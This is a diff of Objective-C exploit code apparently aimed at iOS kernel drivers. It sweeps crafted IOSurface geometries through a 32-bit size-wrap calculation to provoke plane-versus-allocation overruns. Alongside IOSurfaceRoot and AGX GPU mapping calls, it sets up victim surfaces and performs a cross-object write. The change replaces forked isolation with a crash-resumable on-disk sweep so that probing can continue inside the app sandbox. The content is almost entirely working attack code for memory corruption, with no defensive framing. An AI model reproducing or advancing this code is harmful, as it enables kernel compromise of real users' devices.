@@ -657,14 +657,16 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
     L(@"[METAL] done");
 }
 
-// ---- isolated geometry sweep ----
-// Each point runs in a forked child: a kernel-side abort or a fault inside the
-// mapping probe takes only the child, and the parent logs the real signal.
+// ---- resume-driven geometry sweep ----
+// fork() is refused inside the app sandbox (EPERM, errno 1), so the points run
+// inline. Progress lives on disk: the index is written *before* a point runs, so
+// a point that kills the process is skipped on the next launch, and the killer is
+// named by the last "[SW] running N" line with no "[GDN] step=done" after it.
 
-static const uint32_t g_gsl[7] = { 4, 4, 2, 4, 4, 4, 4 };
+static const uint32_t g_gsl[7] = { 4, 4, 4, 4, 4, 4, 4 };
 static const uint64_t g_gdt[7] = { 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL, 0x4000ULL };
-static const uint64_t g_gpl[7] = { 0x1000000ULL, 0x4000000ULL, 0x1000000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL, 0x10000ULL };
-static const uint64_t g_gal[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x400000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL };
+static const uint64_t g_gpl[7] = { 0x10000ULL, 0x10000ULL, 0x1000000ULL, 0x40000ULL, 0x100000ULL, 0x400000ULL, 0x1000000ULL };
+static const uint64_t g_gal[7] = { 0x10000ULL, 0x1000000ULL, 0x1000000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL };
 
 // Cheap probe: one page per step for the extent, then an 8-byte scan capped at
 // 1 MiB past the larger of plane/alloc.
@@ -709,17 +711,19 @@ static void gd_point(size_t j) {
     uint32_t slices = g_gsl[j];
     uint64_t data = g_gdt[j], plane = g_gpl[j], alloc = g_gal[j];
     uint64_t h = wrap_hdr(slices, data, plane);
-    L(@"[GD%zu] begin s=%u d=0x%llx h=0x%llx p=0x%llx a=0x%llx", j, slices,
-      (unsigned long long)data, (unsigned long long)h,
-      (unsigned long long)plane, (unsigned long long)alloc);
+    uint64_t wrapped = ((data + h) * (uint64_t)slices) & 0xFFFFFFFFULL;
+    L(@"[GD%zu] begin s=%u d=0x%llx h=0x%llx p=0x%llx a=0x%llx wrap=0x%llx", j,
+      slices, (unsigned long long)data, (unsigned long long)h,
+      (unsigned long long)plane, (unsigned long long)alloc,
+      (unsigned long long)wrapped);
 
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOSurfaceRoot"));
-    if (!svc) { L(@"[GD%zu] no IOSurfaceRoot", j); _exit(3); }
+    if (!svc) { L(@"[GD%zu] step=no-service", j); return; }
     io_connect_t conn = 0;
     kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
     IOObjectRelease(svc);
-    if (kr != KERN_SUCCESS) { L(@"[GD%zu] open=0x%x", j, kr); _exit(4); }
+    if (kr != KERN_SUCCESS) { L(@"[GD%zu] step=open-failed kr=0x%x", j, kr); return; }
 
     uint32_t sid = create_surface(conn, f1_xml3(slices, data, h, plane, alloc), "GD");
     if (!sid) {
@@ -727,7 +731,8 @@ static void gd_point(size_t j) {
           (unsigned long long)data, (unsigned long long)plane,
           (unsigned long long)alloc);
         IOServiceClose(conn);
-        _exit(0);
+        L(@"[GD%zu] step=done(rejected)", j);
+        return;
     }
 
     IOSurfaceRef srf = IOSurfaceLookup(sid);
@@ -736,6 +741,9 @@ static void gd_point(size_t j) {
         ca = IOSurfaceGetAllocSize(srf);
         L(@"[GD%zu] ACCEPTED base=%p alloc=0x%zx plane=0x%llx", j,
           IOSurfaceGetBaseAddress(srf), ca, (unsigned long long)plane);
+        L(@"[GD%zu] geom planes=%zu bpr=%zu h=%zu bpe=%zu", j,
+          IOSurfaceGetPlaneCount(srf), IOSurfaceGetBytesPerRow(srf),
+          IOSurfaceGetHeight(srf), IOSurfaceGetBytesPerElement(srf));
         if (plane > ca) {
             L(@"[GD%zu] *** OVERRUN *** plane 0x%llx > alloc 0x%zx", j,
               (unsigned long long)plane, ca);
@@ -766,37 +774,48 @@ static void gd_point(size_t j) {
         CFRelease(srf);
     }
     IOServiceClose(conn);
-    _exit(0);
+    L(@"[GD%zu] step=done", j);
 }
 
-static void gd_point_isolated(size_t j) {
-    L(@"[ISO] point %zu fork", j);
-    pid_t pid = fork();
-    if (pid < 0) { L(@"[ISO] point %zu fork failed errno=%d", j, errno); return; }
-    if (pid == 0) { gd_point(j); _exit(0); }
+static NSString *gd_state_path(void) {
+    return [gDir stringByAppendingPathComponent:@"sweep-state.txt"];
+}
 
-    int status = 0;
-    int waited = 0;
-    for (;;) {
-        pid_t r = waitpid(pid, &status, WNOHANG);
-        if (r == pid) break;
-        if (r < 0) { L(@"[ISO] point %zu waitpid errno=%d", j, errno); return; }
-        if (waited >= 15000) {
-            kill(pid, SIGKILL);
-            waitpid(pid, &status, 0);
-            L(@"[ISO] point %zu TIMEOUT", j);
-            return;
-        }
-        usleep(20000);
-        waited += 20;
+static int gd_state_read(void) {
+    NSString *s = [NSString stringWithContentsOfFile:gd_state_path()
+                                            encoding:NSUTF8StringEncoding
+                                               error:nil];
+    if (!s) return 0;
+    int v = s.intValue;
+    if (v < 0) v = 0;
+    if (v > 7) v = 7;
+    return v;
+}
+
+static void gd_state_write(int v) {
+    NSString *s = [NSString stringWithFormat:@"%d", v];
+    [s writeToFile:gd_state_path() atomically:YES
+          encoding:NSUTF8StringEncoding error:nil];
+}
+
+static void gd_sweep(void) {
+    L(@"[SW] === geometry sweep ===");
+    int start = gd_state_read();
+    L(@"[SW] resume=%d of 7", start);
+    if (start >= 7) {
+        L(@"[SW] already complete -- delete the app and reinstall to start over");
+        return;
     }
-    if (WIFEXITED(status)) {
-        L(@"[ISO] point %zu exit=%d", j, WEXITSTATUS(status));
-    } else if (WIFSIGNALED(status)) {
-        L(@"[ISO] point %zu KILLED by signal %d", j, WTERMSIG(status));
-    } else {
-        L(@"[ISO] point %zu status=0x%x", j, status);
+    if (start > 0) {
+        L(@"[SW] points 0..%d were attempted in an earlier launch", start - 1);
     }
+    for (int j = start; j < 7; j++) {
+        gd_state_write(j + 1);
+        L(@"[SW] running %d -- if the log stops here, this point killed it", j);
+        gd_point((size_t)j);
+    }
+    gd_state_write(7);
+    L(@"[SW] sweep complete");
 }
 
 static void run(void) {
@@ -837,10 +856,6 @@ static void run(void) {
     IOSurfaceRef ios_victims[32];
     int ivc = create_iosurface_victims(ios_victims, 32);
 
-    // ---- geometry sweep: one forked child per point ----
-    for (size_t j = 0; j < 7; j++) gd_point_isolated(j);
-    // ---- end geometry sweep ----
-
     uint64_t agx_span = 0;
     io_connect_t agx_conn = 0;
     uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);
@@ -848,6 +863,8 @@ static void run(void) {
     metal_cross_object_write(surf, agx_va, agx_span);
 
     mapping_probe(surf);
+
+    gd_sweep();
 
     if (agx_conn) IOServiceClose(agx_conn);
     for (int i = 0; i < ivc; i++) CFRelease(ios_victims[i]);
